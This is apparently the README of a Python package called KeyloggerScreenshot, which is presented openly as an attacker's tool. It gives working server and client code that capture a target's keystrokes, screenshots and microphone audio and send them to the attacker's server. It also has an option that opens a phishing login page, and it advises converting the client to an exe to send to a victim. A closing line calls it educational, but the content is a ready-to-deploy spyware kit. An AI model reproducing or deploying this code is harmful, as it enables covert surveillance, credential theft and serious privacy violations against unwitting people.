KeyloggerScreenshot
==================

Created by: Fawaz Bashiru

KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. You can open a link when the keylogger is executed. Follow the instructions to build your own server in "KeyloggerScreenshot"

check out my github (easier way):
https://github.com/Kill0geR/KeyloggerScreenshot

SHOUT OUT TO:

He had the idea of the mouse information. He also build the graphical user interface. Big thanks to him

HOW DOES KeyloggerScreenshot WORK?
================================
To install KeyloggerScreenshot simply write:

`pip install KeyloggerScreenshot`

in your terminal

After that create a server:

Server
-----

````python
#EveryServer.py:
import KeyloggerScreenshot as ks
import threading

ip = "127.0.0.1"

ip_photos, port_photos = ip, 1111
server_photos = ks.ServerPhotos(ip_photos, port_photos)

ip_keylogger, port_keylogger = ip, 2222
server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)

ip_listener, port_listener = ip, 3333
server_listener = ks.ServerListener(ip_listener, port_listener)

ip_time, port_time = ip, 4444
server_time = ks.Timer(ip_time, port_time)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start()
````


Then create the client

Client
------

````python
#client_target.py
import KeyloggerScreenshot as ks
import threading

thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
thread_deleter.start()

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
key_client.start()
````

You can specify the time of running in seconds in the "duration_in_seconds" variable

Essential Informations:
------------------------

* This module can be used in Windows and Linux

* The servers can now be run in the same file with the module threading

* The port number for each server should be different

* The server should obviously be run before the client

* You can just copy the following code and insert you ip-address in the variable "ip"

* You can find your ip-address in the command line by using the command "ipconfig"

* If you want a cool simulation you can specify that in ServerKeylogger by setting the Parameter simulater to True

* You can open a link that you can choose when the keylogger is executed. Set the Parameter "phishing_web" to your link

* If you really want to send this to work externally, you have to buy a server and download the code on my github.

* If backspace is pressed the last pressed character will be deleted from the list

Additional
==========
* You can send "target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* The servers can be used on any OS. The ideal target should use Windows as his OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. THIS WAS BUILD FOR EDUCATIONAL PURPOSES.
